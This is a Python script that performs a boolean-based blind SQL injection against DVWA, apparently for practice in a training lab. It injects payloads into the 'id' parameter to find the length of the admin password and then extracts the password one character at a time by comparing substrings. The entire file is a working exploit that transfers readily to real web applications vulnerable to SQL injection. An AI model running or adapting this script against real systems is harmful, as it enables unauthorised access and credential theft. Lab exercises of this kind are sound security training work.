import requests
import string
import os
from dotenv import load_dotenv

load_dotenv()

DVWA_URL = os.getenv("DVWA_URL")
PHPSESSID = os.getenv("PHPSESSID")
SECURITY = "low"

# Alphabet includes numbers, lowercase and uppercase letters
alphabet = string.digits + string.ascii_letters

def get_password_length():
    i = 1
    while True:
        injection = f"1' AND (SELECT LENGTH(password) FROM users WHERE user='admin')={i} #"
        response = send_request(injection)
        if "First name: admin" in response.text:
            return i
        i += 1

def get_password():
    password_length = get_password_length()
    password = ""
    for i in range(1, password_length + 1):
        for char in alphabet:
            injection = f"1' AND SUBSTRING((SELECT password FROM users WHERE user='admin'),{i},1)='{char}' #"
            response = send_request(injection)
            if "First name: admin" in response.text:
                password += char
                print(f"Character {i} is {char}")
                break
    return password

def send_request(injection):
    cookies = {
        "PHPSESSID": PHPSESSID,
        "security": SECURITY
    }
    data = {
        'id': injection,
        'Submit': 'Submit'
    }
    response = requests.get(DVWA_URL, cookies=cookies, params=data)
    return response

def main():
    password = get_password()
    print(f"Final password: {password}")

if __name__ == "__main__":
    main()
